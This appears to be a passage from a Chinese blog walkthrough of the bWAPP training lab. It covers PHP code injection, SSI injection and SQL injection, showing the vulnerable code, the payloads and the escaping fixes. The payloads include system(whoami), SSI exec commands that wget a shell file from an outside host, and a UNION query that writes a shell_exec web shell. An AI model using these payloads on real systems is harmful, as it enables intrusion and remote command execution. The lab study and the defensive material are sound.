<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查看 phpinfo</span></span><br><span class="line">?message=phpinfo()</span><br><span class="line"><span class="comment">// 查看目录</span></span><br><span class="line">?message=var_dump(scandir(<span class="string">'./'</span>))</span><br><span class="line"><span class="comment">// 执行任意命令</span></span><br><span class="line"><span class="number">1</span>;system(whoami)</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-7"><a href="#防护方式-7" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"message"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   &lt;p&gt;&lt;i&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($_REQUEST[<span class="string">"message"</span>], ENT_QUOTES, <span class="string">"UTF-8"</span>);;<span class="meta">?&gt;</span>&lt;/i&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>htmlspecialchars 过滤且没有 eval 函数</p>
<h1 id="Server-Side-Includes-SSI-Injection"><a href="#Server-Side-Includes-SSI-Injection" class="headerlink" title="Server-Side Includes (SSI) Injection"></a>Server-Side Includes (SSI) Injection</h1><h2 id="补充知识-1"><a href="#补充知识-1" class="headerlink" title="补充知识"></a>补充知识</h2><p>SSIs are directives present on Web applications used to feed an HTML<br>page with dynamic contents. They are similar to CGIs, except that SSIs<br>are used to execute some actions before the current page is loaded or<br>while the page is being visualized. In order to do so, the web server<br>analyzes SSI before supplying the page to the user. </p>
<p>The Server-Side Includes attack allows the exploitation of a web<br>application by injecting scripts in HTML pages or executing arbitrary<br>codes remotely. It can be exploited through manipulation of SSI in use<br>in the application or force its use through user input fields. </p>
<p>SSIs 是使用动态内容填充 HTML 页面。它和 CGIs 类似，但是 SSIs 会在页面加载之前或者用户看到之前进行一些动作。在把页面返回给用户之前，Web 服务器会解析 SSI。SSI 攻击允许利用 Web 应用在 HTML 页面中插入脚本或者执行任意远程代码。它可以通过使用 SSI 操作的 Web 应用利用，或者通过用户输入字段强制使用。</p>
<p>SSI 类似于模板渲染，在页面加载之前，服务器会解析其中的内容。</p>
<p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/66934.html</a></p>
<h2 id="产生原因-8"><a href="#产生原因-8" class="headerlink" title="产生原因"></a>产生原因</h2><p>ssii.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $firstname = ucwords(xss($_POST[<span class="string">"firstname"</span>]));</span><br><span class="line">    $lastname = ucwords(xss($_POST[<span class="string">"lastname"</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($firstname == <span class="string">""</span> <span class="keyword">or</span> $lastname == <span class="string">""</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $field_empty = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $line = <span class="string">'&lt;p&gt;Hello '</span>.$firstname.<span class="string">' '</span>.$lastname.<span class="string">',&lt;/p&gt;&lt;p&gt;Your IP address is:'</span>.<span class="string">'&lt;/p&gt;&lt;h1&gt;&lt;!--#echo var="REMOTE_ADDR" --&gt;&lt;/h1&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Writes a new line to the file</span></span><br><span class="line">        $fp = fopen(<span class="string">"ssii.shtml"</span>, <span class="string">"w"</span>);</span><br><span class="line">        fputs($fp, $line, <span class="number">200</span>);</span><br><span class="line">        fclose($fp);</span><br><span class="line"></span><br><span class="line">        header(<span class="string">"Location: ssii.shtml"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ssii.shtml</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello Wwww Wwww,<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Your IP address is:<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="comment">&lt;!--#echo var="REMOTE_ADDR" --&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>未对输入过滤，导致可以构造 SSI 语句，提交到后端执行</p>
<h2 id="利用方式-8"><a href="#利用方式-8" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// List files of directory</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="ls" --&gt;</span></span><br><span class="line">// Get shell</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="防护方式-8"><a href="#防护方式-8" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 addslashes 函数转义，把双引号去掉就可以了</p>
<p>绕过 : </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// List files of directory</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=ls --&gt;</span></span><br><span class="line">// Get shell</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=wget http://mysite.com/shell.txt | rename shell.txt shell.php --&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_3</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 htmlspecialchars 函数转义</p>
<h1 id="SQL-Injection-GET-Search"><a href="#SQL-Injection-GET-Search" class="headerlink" title="SQL Injection (GET/Search)"></a>SQL Injection (GET/Search)</h1><h2 id="产生原因-9"><a href="#产生原因-9" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"title"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入参数 title，查询数据库中是否有满足 title 条件的记录</p>
<p>此处未对传入参数过滤，如果输入 <code>a%&#39;</code>，输出代码就变为 <code>SELECT * FROM movies WHERE title LIKE &#39;%a%&#39;%&#39;</code>，语句错误，报错无法查询</p>
<h2 id="利用方式-9"><a href="#利用方式-9" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 判断查询的字段数及出现位置</span><br><span class="line">a%&apos; union select 1,2,3,4,5,6,7 #</span><br><span class="line">// 查询所有表</span><br><span class="line">a%&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7 #</span><br><span class="line">// 写入 shell (如果有写入权限)</span><br><span class="line">a%&apos; union select 1,&quot;&lt;?php echo shell_exec($_GET[&apos;cmd&apos;])?&gt;&quot;,3,4,5,6,7 into OUTFILE &apos;/var/www/bWAPP/shell.php&apos; #</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-9"><a href="#防护方式-9" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>addslashes 转义，暂时没有绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mysql_real_escape_string($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mysql_real_escape_string 函数转义 SQL 语句中使用的字符串中的特殊字符，暂时没有绕过</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_7.png" alt></p>
<p>这两处防护无法绕过，因为绕过需要闭合 <code>&#39;%</code>，就必须要 <code>&#39;</code>，这两个函数过滤了 <code>&#39;&#39;</code></p>
<h1 id="SQL-Injection-GET-Select"><a href="#SQL-Injection-GET-Select" class="headerlink" title="SQL Injection (GET/Select)"></a>SQL Injection (GET/Select)</h1><h2 id="产生原因-10"><a href="#产生原因-10" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"movie"</span>]))</span><br><span class="line">&#123;   </span><br><span class="line">    $id = $_GET[<span class="string">"movie"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the user selects a movie</span></span><br><span class="line">    <span class="keyword">if</span>($id)        </span><br><span class="line">    &#123;</span><br><span class="line">        $sql.= <span class="string">" WHERE id = "</span> . sqli($id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原理同上，当传入参数 movie 为 <code>1&#39;</code>时，语句为 <code>SELECT * FROM movies WHERE id = 1&#39;</code>，语法错误，无法查询</p>
<h2 id="利用方式-10"><a href="#利用方式-10" class="headerlink" title="利用方式"></a>利用方式</h2><p>同上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 判断查询的字段数及出现位置</span><br><span class="line">?movie=-1 union select 1,2,3,4,5,6,7 %23</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-10"><a href="#防护方式-10" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function sqli($data)&#123;</span><br><span class="line">    return mysql_real_escape_string($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里不需要单引号也可以注入</p>
<p>绕过 : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?movie=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7 %23</span><br></pre></td></tr></table></figure>

<h1 id="SQL-Injection-POST-Search"><a href="#SQL-Injection-POST-Search" class="headerlink" title="SQL Injection (POST/Search)"></a>SQL Injection (POST/Search)</h1><h2 id="产生原因-11"><a href="#产生原因-11" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"title"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $title = $_POST[<span class="string">"title"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原理和 GET 相同，只是提交数据的方式换成了 POST</p>
<h2 id="利用方式-11"><a href="#利用方式-11" class="headerlink" title="利用方式"></a>利用方式</h2><p>与 GET 相同</p>
<h2 id="防护方式-11"><a href="#防护方式-11" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数过滤</p>
<h1 id="SQL-Injection-POST-Select"><a href="#SQL-Injection-POST-Select" class="headerlink" title="SQL Injection (POST/Select)"></a>SQL Injection (POST/Select)</h1><h2 id="产生原因-12"><a href="#产生原因-12" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"movie"</span>]))</span><br><span class="line">&#123;   </span><br><span class="line">    $id = $_POST[<span class="string">"movie"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the user selects a movie</span></span><br><span class="line">    <span class="keyword">if</span>($id)        </span><br><span class="line">    &#123;</span><br><span class="line">        $sql.= <span class="string">" WHERE id = "</span> . sqli($id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原理和 GET 相同，只是提交数据的方式换成了 POST</p>
<h2 id="利用方式-12"><a href="#利用方式-12" class="headerlink" title="利用方式"></a>利用方式</h2><p>与 GET 相同</p>
<h2 id="防护方式-12"><a href="#防护方式-12" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数过滤</p>
<h1 id="SQL-Injection-AJAX-JSON-jQuery"><a href="#SQL-Injection-AJAX-JSON-jQuery" class="headerlink" title="SQL Injection (AJAX/JSON/jQuery)"></a>SQL Injection (AJAX/JSON/jQuery)</h1><h2 id="产生原因-13"><a href="#产生原因-13" class="headerlink" title="产生原因"></a>产生原因</h2><p>sqli_10-1.php</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$(<span class="string">"#title"</span>).keyup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="comment">// Searches for a movie title</span></span><br><span class="line">	<span class="keyword">var</span> search = &#123;<span class="attr">title</span>: $(<span class="string">"#title"</span>).val()&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AJAX call</span></span><br><span class="line">	$.getJSON(<span class="string">"sqli_10-2.php"</span>, search, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">		init_table();</span><br><span class="line">		<span class="comment">// Constructs the table from the JSON data</span></span><br><span class="line">		<span class="keyword">var</span> total = <span class="number">0</span>;</span><br><span class="line">		$.each(data, <span class="function"><span class="keyword">function</span>(<span class="params">key, val</span>)</span>&#123;</span><br><span class="line">			total++;</span><br><span class="line">			$(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr&gt;&lt;td&gt;"</span> + val.title + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.release_year + <span class="string">"&lt;/td&gt;&lt;td&gt;"</span> + val.main_character + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.genre + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;&lt;a href='http://www.imdb.com/title/"</span> + val.imdb + <span class="string">"' target='_blank'&gt;Link&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">			&#125;);</span><br><span class="line">		<span class="comment">// Empty result</span></span><br><span class="line">		<span class="keyword">if</span> (total == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			$(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr height='30'&gt;&lt;td colspan='5' width='580'&gt;No movies were found!&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init_table</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">"#table_yellow"</span>).html(<span class="string">"&lt;tr height='30' bgcolor='#ffb717' align='center'&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='200'&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='80'&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='140'&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='80'&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;td width='80'&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;"</span> +</span><br><span class="line">		<span class="string">"&lt;/tr&gt;"</span></span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>sqli_10-2.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">"title"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Retrieves the movie title</span></span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Constructs the query</span></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Queries the database</span></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fetches the result</span></span><br><span class="line">    <span class="keyword">if</span>(mysql_num_rows($recordset) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>($row = mysql_fetch_array($recordset))</span><br><span class="line">        &#123;</span><br><span class="line">            $movies[] = $row;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $movies = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $movies = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: text/json; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Encodes the result to JSON</span></span><br><span class="line"><span class="keyword">echo</span> json_encode($movies);</span><br></pre></td></tr></table></figure>

<p>这里是使用 Ajax 异步提交数据的方式，如果直接修改 URL 或者刷新页面是不会返回数据的</p>
<p>但是用 burp 抓包之后修改 title 就可以注入。这里注入的原理也是输入未过滤导致可以构造 sql 语句。</p>
<h2 id="利用方式-13"><a href="#利用方式-13" class="headerlink" title="利用方式"></a>利用方式</h2><p>抓包修改 title，构造 sql 语句，查看返回的 json 数据</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_8.png" alt></p>
<h2 id="防护方式-13"><a href="#防护方式-13" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p>
<h1 id="SQL-Injection-CAPTCHA"><a href="#SQL-Injection-CAPTCHA" class="headerlink" title="SQL Injection (CAPTCHA)"></a>SQL Injection (CAPTCHA)</h1><h2 id="产生原因-14"><a href="#产生原因-14" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"title"</span>])) </span><br><span class="line">&#123;   </span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>原理和前面的类似，只是在前面加了一个验证码的页面，防止工具注入，可以用脚本识别</p>
<h2 id="利用方式-14"><a href="#利用方式-14" class="headerlink" title="利用方式"></a>利用方式</h2><p>输入验证码之后进行注入</p>
<p>payload : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%&apos; union select 1,2,3,4,5,6,7 #</span><br></pre></td></tr></table></figure>

